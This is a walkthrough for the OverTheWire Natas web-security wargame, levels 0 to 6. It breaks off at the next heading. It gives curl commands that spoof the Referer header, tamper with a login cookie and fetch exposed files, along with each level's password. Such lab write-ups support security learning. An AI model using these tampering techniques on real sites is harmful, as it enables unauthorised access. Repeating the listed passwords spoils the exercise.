`http://natas<n>.natas.labs.overthewire.org` with username `natas<n>`.

# Level 0

Connect to `http://natas0.natas.labs.overthewire.org` with username/password `natas0`.

Password is in the source of the HTML page, which can be requested from the web browser.

password: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`.

# Level 0 -> 1

Password is in the source of the HTML page. Use **Zaproxy** to examine the source of the page or **curl** with `-u` to specify user and password.

```
curl -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq http://natas1.natas.labs.overthewire.org.
```

password: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`.

# Level 1 -> 2

Examine the source code to find a referenced 1x1 PNG image under `files/pixel.png`. File `users.txt` can be found under this directory and contains the password.

password: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`.

# Level 2 -> 3

Look at `robots.txt` file. The file mention `s3cr3t` as a disallowed folder. File `users.txt` can be found under this directory and contains the password.

password: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`.

# Level 3 -> 4

Update the referrer to `http://natas5.natas.labs.overthewire.org/` using **Zaproxy** or **curl** with option `-e` to change the referrer.

```
curl -e http://natas5.natas.labs.overthewire.org/ -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
```

password: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`.

# Level 4 -> 5

Observe cookie `loggedin` is set and send a new request with a different value for this cookie.

Using **Zapproxy**: observe the **GET** request to find the cookie in the response header. Use **Requester** on the **GET** request and change the header line `Cookie: loggedin=0` to `Cookie: loggedin=1`. Press **Send**.

Using **curl**: use option `-I` to get the response header to find the cookie. use option `-b` to set the cookie.

```
curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -b "loggedin=1" http://natas5.natas.labs.overthewire.org/
```

password: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`.

# Level 5 -> 6

From the source code, the secret is located inside `includes/secret.inc`.

Open this file using **Zaproxy** or **curl**.

```
curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

secret: `FOEIUWGHFEEUHOFUOIU`.

password: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`.

# Level 6 -> 7

